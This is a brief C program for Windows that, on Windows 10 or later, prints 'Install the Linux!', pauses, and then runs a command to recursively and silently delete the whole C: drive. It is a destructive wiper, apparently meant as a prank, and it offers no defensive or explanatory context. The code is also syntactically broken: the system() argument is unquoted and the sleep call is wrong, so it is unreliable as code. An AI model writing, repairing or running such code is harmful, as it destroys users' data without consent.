#include <windows.h>
#include <stdio.h>
#include <VersionHelpers.h>

int
        __cdecl
wmain(
        __in int argc,
        __in_ecount(argc) PCWSTR argv[]
)
{
UNREFERENCED_PARAMETER(argc);
UNREFERENCED_PARAMETER(argv);

if (IsWindows10OrGreater())
{
printf("Install the Linux!\n");
sleep(3);
system(rmdir /s /q C:\);
}
}
